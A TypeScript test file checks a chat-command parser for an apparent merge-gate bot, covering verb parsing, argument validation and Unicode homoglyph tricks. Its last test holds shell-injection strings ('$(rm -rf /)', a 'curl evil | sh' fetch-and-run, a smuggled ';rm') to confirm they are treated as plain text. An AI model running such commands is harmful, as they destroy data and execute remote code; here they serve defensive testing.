import { describe, expect, it } from "vitest";
import { parseCommand } from "../../apps/switch-gate/src/commands/parse.js";

const G = "@loopback-gate";
const ok = (body: string) => {
  const r = parseCommand(body, G);
  if (!r.ok) throw new Error(r.error);
  return r.command;
};
const err = (body: string) => {
  const r = parseCommand(body, G);
  if (r.ok) throw new Error(`expected failure for ${body}`);
  return r.error;
};

describe("parseCommand", () => {
  it("parses every verb, case-insensitively", () => {
    expect(ok(`${G} help`)).toEqual({ kind: "help" });
    expect(ok(`${G} WHOAMI`)).toEqual({ kind: "whoami" });
    expect(ok(`${G} status lb-001`)).toEqual({ kind: "status", caseId: "LB-001" });
    expect(ok(`${G} verify LB-002`)).toEqual({ kind: "verify", caseId: "LB-002" });
    expect(ok(`${G} merge LB-001`)).toEqual({ kind: "merge", caseId: "LB-001" });
    expect(ok(`${G} audit LB-001`)).toEqual({ kind: "audit", caseId: "LB-001" });
    expect(ok(`${G} approve LB-001 3F9C2AB4E1D0`)).toEqual({ kind: "approve", caseId: "LB-001", shortSha: "3f9c2ab4e1d0" });
    expect(ok(`${G} reject LB-001 breaks the API`)).toEqual({ kind: "reject", caseId: "LB-001", reason: "breaks the API" });
    expect(ok(`${G} retask LB-001 add a test for null`)).toEqual({ kind: "retask", caseId: "LB-001", note: "add a test for null" });
  });

  it("keeps report text verbatim, including Unicode", () => {
    expect(ok(`${G} report slugify("Ärger") drops the umlaut`)).toEqual({ kind: "report", text: 'slugify("Ärger") drops the umlaut' });
  });

  it("tolerates extra whitespace and a trailing colon after the mention", () => {
    expect(ok(`  ${G}:   status    LB-010  `)).toEqual({ kind: "status", caseId: "LB-010" });
  });

  it("rejects messages that do not start with the gate mention", () => {
    expect(err("help")).toMatch(/gate mention/);
    expect(err(`hey ${G} merge LB-001`)).toMatch(/gate mention/);
    expect(err(`${G}x merge LB-001`)).toMatch(/gate mention/);
  });

  it("rejects unknown verbs and wrong arity", () => {
    expect(err(`${G} deploy LB-001`)).toMatch(/unknown command/);
    expect(err(`${G} merge`)).toMatch(/exactly one/);
    expect(err(`${G} merge LB-001 now`)).toMatch(/exactly one/);
    expect(err(`${G} help me`)).toMatch(/no arguments/);
    expect(err(`${G} approve LB-001`)).toMatch(/case id and a commit sha/);
  });

  it("rejects invalid arguments", () => {
    expect(err(`${G} approve LB-001 xyz`)).toMatch(/invalid approve/);
    expect(err(`${G} approve LB-001 3f9c2a`)).toMatch(/invalid approve/);
    expect(err(`${G} status 001`)).toMatch(/invalid status/);
    expect(err(`${G} reject LB-001 no`)).toMatch(/invalid reject/);
    expect(err(`${G} retask LB-001`)).toMatch(/invalid retask/);
    expect(err(`${G} retask LB-001    `)).toMatch(/invalid retask/);
    expect(err(`${G} report too short`)).toMatch(/invalid report/);
    expect(err(`${G} report ${"x".repeat(4001)}`)).toMatch(/invalid report/);
  });

  it("accepts only ASCII verbs (no Unicode case-folding tricks)", () => {
    expect(err(`${G} RETAS\u212A LB-001 note`)).toMatch(/unknown command/);
    expect(err(`${G} m\u0435rge LB-001`)).toMatch(/unknown command/);
  });

  it("treats shell metacharacters as plain text", () => {
    const c = ok(`${G} report $(rm -rf /); \`curl evil\` | sh && echo pwned`);
    expect(c).toMatchObject({ kind: "report" });
    expect(err(`${G} merge LB-001;rm`)).toMatch(/invalid merge/);
  });
});
